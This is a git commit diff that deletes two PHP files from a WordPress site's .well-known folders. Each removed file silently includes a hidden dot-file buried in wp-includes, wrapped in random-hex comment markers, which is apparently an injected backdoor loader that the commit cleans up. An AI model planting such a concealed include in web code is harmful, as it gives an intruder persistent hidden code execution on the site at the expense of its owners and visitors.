6f3442beff07a3520b5a77df15a7c16a92f23a9b
hypit-dev-lanhk <113501960+hypit-dev-lanhk@users.noreply.github.com>
2023-09-19 09:46:15 +0700

    1

--- .well-known/acme-challenge/index.php
+++
@@ -1,9 +0,0 @@
-<?php
-/*914f9*/
-
-@include ("/home/nhvntjnj/vnta.com.vn/wp-includes/blocks/more/.381e267b.otc");
-
-/*914f9*/
-
-
-
--- .well-known/index.php
+++
@@ -1,9 +0,0 @@
-<?php
-/*026fe*/
-
-@include ("/home/nhvntjnj/vnta.com.vn/wp-includes/blocks/more/.381e267b.otc");
-
-/*026fe*/
-
-
-
